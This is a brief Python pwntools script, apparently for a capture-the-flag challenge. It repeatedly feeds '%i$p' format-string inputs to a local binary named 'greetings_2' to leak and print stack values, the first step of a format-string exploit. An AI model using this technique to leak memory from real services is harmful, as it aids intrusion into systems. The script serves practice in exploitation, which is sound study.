from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./greetings_2', checksec=False)

# Let's fuzz x values
for i in range(30):
    try:
        # Create process (level used to reduce noise)
        p = process(level='error')
        # Format the counter
        p.sendlineafter(b'Name: ','BBBB')
        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
        p.sendline('%{}$p'.format(i).encode())
        # Receive the response
        for _ in range(4):
                p.recvline()
                
        try:
                result = p.recvline().decode()
        except:
                print("can't decode", result)
                continue
        # If the item from the stack isn't empty, print it
        if result:
            print(str(i) + ': ' + str(result).strip())
    except EOFError:
        pass
